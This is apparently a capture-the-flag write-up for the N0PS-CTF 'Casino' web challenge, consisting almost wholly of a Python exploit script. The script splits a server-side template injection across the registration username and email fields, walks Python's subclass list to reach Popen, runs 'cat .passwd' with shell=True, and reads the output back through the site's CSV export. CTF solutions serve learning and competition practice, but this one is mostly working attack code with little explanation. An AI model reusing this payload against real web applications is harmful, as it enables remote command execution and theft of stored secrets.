---
author: la1n
title: "N0PS-CTF / Web / Casino Solution"
description: "Python solution"
pubDate: "Jul 10 2025"
heroImage: "/writeups/la1n.jpg"
---

Official writeup - https://github.com/N0PSctf/N0PSctf-2025/blob/main/web/casino/writeup.md

Exploit script:

```python
import random
import html
import string
import requests
import sys
import re

length = 6
random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=length))

url = 'https://nopsctf-casino.chals.io'

# 1. basic payload
# username = 'lain'+random_str+'{{'
# email = ' 7*7 }}lain@email.com'

# 2. finding index of popen
#username = 'lain'+random_str+'{{'
#email = " ''.__class__.__base__.__subclasses__() }}"
#match = re.search(r'\[(.+)\]', x)
#x = html.unescape(csv)
#x = match.group(1)
#arr = x.split(',')
#for i in range(len(arr)):
#    if 'popen' in arr[i].lower():
#        print(i)
#        print(arr[i])

# 3. final payload
username = 'lain'+random_str+'{{'
# file .passwd was discoverd with ls -al command
email = " ''.__class__.__base__.__subclasses__()[528]('cat .passwd', shell=True, stdout=-1).communicate() }}"

# main part
data = {
    'username': username,
    'email': email,
    'password': '123456'
}
print(data)

res = requests.post(url+'/register', data=data)

data = {
    'username': username,
    'password': '123456'
}
res = requests.post(url+'/login', data=data, allow_redirects=False)

cookie = res.cookies.get_dict()
print(cookie)
res = requests.get(url+'/export', cookies=cookie)
csv = res.content.decode('utf-8')
x = html.unescape(csv)

print(x)
```